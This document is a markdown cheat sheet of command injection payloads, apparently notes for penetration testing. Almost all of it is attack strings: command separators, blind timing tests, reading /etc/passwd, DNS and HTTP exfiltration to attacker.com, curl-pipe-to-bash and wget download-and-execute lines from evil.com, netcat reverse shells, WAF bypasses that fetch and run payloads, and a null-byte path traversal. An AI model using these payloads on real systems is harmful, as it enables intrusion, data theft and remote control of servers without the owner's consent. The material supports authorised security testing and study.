# execute system commands via user input. when filters meet shell functions.

## quick test payloads

basic command separators:
```bash
; id
& whoami  
&& uname -a
| pwd
|| ls -la
`id`
$(whoami)
```

url-encoded newline:
```bash
%0a id
```

## blind testing

time-based confirmation:
```bash
& ping -c 10 127.0.0.1 &
& sleep 10 &
```

output to file:
```bash
& whoami > /var/www/images/output.txt &
& id > /tmp/cmd_output.txt &
```

## enumeration commands

**linux:**
```bash
whoami          # current user
id              # user info and groups  
uname -a        # system info
ifconfig        # network config
ps aux          # running processes
cat /etc/passwd # user accounts
```

**windows:**  
```bash
whoami          # current user
whoami /priv    # user privileges
ipconfig        # network config
dir             # directory listing
ver             # os version
net user        # user accounts
```

## platform-agnostic payloads

work on both linux and windows:
```bash
ls||id
ls | id  
ls && id
ls & id
ls %0A id
```

## out-of-band exploitation

dns exfiltration:
```bash
& nslookup attacker.com &
& nslookup `whoami`.attacker.com &
```

http callback:
```bash
& curl http://attacker.com/callback?data=`id|base64` &  
& wget http://attacker.com/`whoami` &
```

## reverse shells

download and execute:
```bash
& wget https://evil.com/shell.txt -O /tmp/shell.php & php /tmp/shell.php &
& curl https://evil.com/rev.sh | bash &
```

netcat reverse shell:
```bash
& nc -e /bin/bash attacker_ip 4444 &
& nohup nc -e /bin/bash attacker_ip 4444 &
```

## waf bypass techniques

encoding variations:
```bash
vuln=127.0.0.1%0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
```

base64 payload delivery:
```bash
vuln=echo PAYLOAD > /tmp/payload.txt; cat /tmp/payload.txt | base64 -d > /tmp/payload; chmod 744 /tmp/payload; /tmp/payload
```

## null byte bypass (legacy)

poison null byte in old systems:
```bash
/download.php?file=../../etc/passwd%2500.md
```

server parses to `.md` but stops at null byte, returns `/etc/passwd`

## operational notes

- test multiple injection points: url params, post data, headers, cookies
- [!] some payloads crash services - test in isolated environment first
- always use `&` suffix for background execution to avoid hanging requests  
- watch for output in error pages, logs, or accessible files
- time delays prove execution even without visible output

# TODO: test against command injection filters and modsecurity